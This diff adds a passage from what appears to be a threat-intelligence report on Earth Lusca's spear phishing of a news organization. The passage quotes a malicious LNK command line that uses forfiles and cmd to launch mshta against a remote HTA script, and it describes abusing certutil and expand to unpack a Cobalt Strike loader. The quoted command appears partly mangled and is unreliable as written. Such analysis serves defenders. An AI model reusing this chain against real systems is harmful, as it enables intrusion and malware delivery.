@@ -1,0 +1,25 @@
+Spear Phishing
+Through our telemetry data, we observed Earth Lusca sending spear phishing emails containing a
+malicious link to a target news organization. The files in the link were presented either as a document that
+journalists might be interested in, or as an opinion form sent by another media organization. The
+downloaded file is an archive file that contains either a malicious LNK file or an executable file. These
+archives were hosted either on compromised web servers or Google Drive repositories.
+Figure 3. An example of a malicious archive delivered via spear phishing email
+Figure 4. The infection chain of the spear phishing emails
+In some cases, the victims receive an executable file or an SFX installer inside the archive delivered via
+spear phishing that turns out to be a malicious loader. The analysis of the loader is detailed in the
+“Malware Analysis” section.
+In other cases where victims received an LNK file inside the archive, the LNK will execute the
+file %SYSTEM32%\forfiles.exe and give the command string shown in the following argument:
+/m "{name of decoy document}.lnk" /c "cmd /c echo f|xcopy @file %temp%{random name}.tmp&for /r
+c:\windows\system32_ %i in (sht.exe) _do %i [URL of HTA file}"
+The command will move the LNK file into the %TEMP% folder and run mshta.exe to load the malicious
+HTA script from the given URL. The malicious HTA script will then copy certutil.exe to the %APPDATA%
+folder and rename it as a different process name — which was chrome.exe in the case we analyzed. The
+LNK file will then be appended with a Base64-encoded string at the end.
+The HTA script will use the “findstr” command to search for the string “TVNDRgAAA” in the LNK file and
+extract the identified Base64-encoded string to another temporary file.
+Next, it uses the copied certutil.exe to decode the string to a Cabinet file, after which it uses the “expand”
+command to extract the payload from the Cabinet file. The extracted files include a decoy document and
+a malware file, which is a Cobalt Strike loader. The HTA file will open the decoy document and launch the
+loader in background.
